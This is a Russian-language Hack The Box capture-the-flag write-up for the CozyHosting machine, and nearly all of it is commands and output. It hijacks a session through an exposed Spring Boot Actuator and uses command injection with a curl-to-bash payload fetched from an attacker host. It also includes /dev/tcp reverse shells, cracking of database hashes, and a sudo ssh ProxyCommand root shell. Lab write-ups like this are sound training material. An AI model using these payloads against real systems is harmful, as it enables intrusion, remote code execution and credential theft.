# CozyHosting (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Easy  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (nginx)
└── /etc/hosts: 10.129.229.88 cozyhosting.htb

Foothold (Spring Boot Actuator)
├── gobuster → /login, /admin (401), /logout, /error
├── ffuf (Java-Spring-Boot.txt) → /actuator, /actuator/sessions
├── /actuator/sessions → {"...":"kanderson"}
├── DevTools → JSESSIONID = kanderson → /admin
└── /actuator/mappings → POST /executessh

Command Injection (${IFS})
├── rev.sh: bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
└── shell от app

Credential Leak (JAR → PostgreSQL)
├── /app/cloudhosting-0.0.1.jar → BOOT-INF/classes/application.properties
│   └── postgres:<PASSWORD>
├── psql → SELECT * FROM users
│   └── admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
└── hashcat -m 3200 → admin:manchesterunited

User Flag (Password Reuse)
├── ssh josh@10.129.229.88 → manchesterunited
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo ssh ProxyCommand)
├── sudo -l → (root) /usr/bin/ssh *
├── sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/... 0>&1"' x
└── root → cat /root/root.txt (<ROOT_FLAG>)
```

---

## Machine Briefing

Spring Boot-приложение с открытым Actuator, JAR-файлом с паролем БД, bcrypt-хешем админа и `sudo ssh` для LPE.

---

## Reconnaissance

```bash
nmap -p- --min-rate=5000 -T4 -oG - cozyhosting.htb | grep open
nmap -sC -sV -p 22,80 cozyhosting.htb
```

| Порт | Сервис | Версия               |
|------|--------|----------------------|
| 22   | SSH    | OpenSSH 8.9p1 Ubuntu |
| 80   | HTTP   | nginx 1.18.0         |

```bash
echo "10.129.229.88    cozyhosting.htb" | sudo tee -a /etc/hosts
```

---

## Foothold

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

| Путь     | Статус |
|----------|--------|
| /login   | 200    |
| /admin   | 401    |
| /logout  | 204    |
| /error   | 500    |

Паттерн Spring Boot.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
ffuf -w ~/Java-Spring-Boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

Найдены: `/actuator/sessions`, `/actuator/env`, `/actuator/health`, `/actuator/mappings`, `/actuator/beans`.

```bash
curl -s http://cozyhosting.htb/actuator/sessions
```

```json
{"<TOKEN>":"kanderson"}
```

Подменяем `JSESSIONID` → `/admin`.

```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq
```

```
htb.cloudhosting.compliance.ComplianceService
executeOverSsh(String, String, HttpServletResponse)
POST /executessh
```

Фильтр пробелов в username.

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.177/4444 0>&1' > rev.sh
python3 -m http.server 7000
nc -lvnp 4444
```

Payload:

```
test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
```

Shell от `app`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Credential Leak

```bash
ls /app
# cloudhosting-0.0.1.jar
unzip -d /tmp/app /app/cloudhosting-0.0.1.jar
cat /tmp/app/BOOT-INF/classes/application.properties
```

```
spring.datasource.username=postgres
spring.datasource.password=<PASSWORD>
```

```bash
psql -h 127.0.0.1 -U postgres
# password: <PASSWORD>
\connect cozyhosting
SELECT * FROM users;
```

```
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

```bash
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash_file
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
# manchesterunited
```

```bash
ssh josh@10.129.229.88
# password: manchesterunited
cat user.txt
# <USER_FLAG>
```

---

## Privilege Escalation

```bash
sudo -l
# User josh may run the following commands on localhost:
#     (root) /usr/bin/ssh *
```

```bash
nc -lvnp 5555
sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
```

`ssh` выполняет `ProxyCommand` до реального SSH-соединения - с правами root.

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Spring Boot Actuator** - `/actuator/sessions` отдаёт ID сессий без авторизации.
- **Command Injection через `${IFS}`** - обход фильтра пробелов.
- **Распаковка JAR** - `application.properties` часто содержит креды БД.
- **bcrypt-хеши в PostgreSQL** - брутфорс через hashcat mode 3200.
- **Password reuse** - пароль админа веб-панели совпал с SSH.
- **`sudo ssh` + `ProxyCommand`** - GTFOBins-вектор, эквивалентный полному root shell.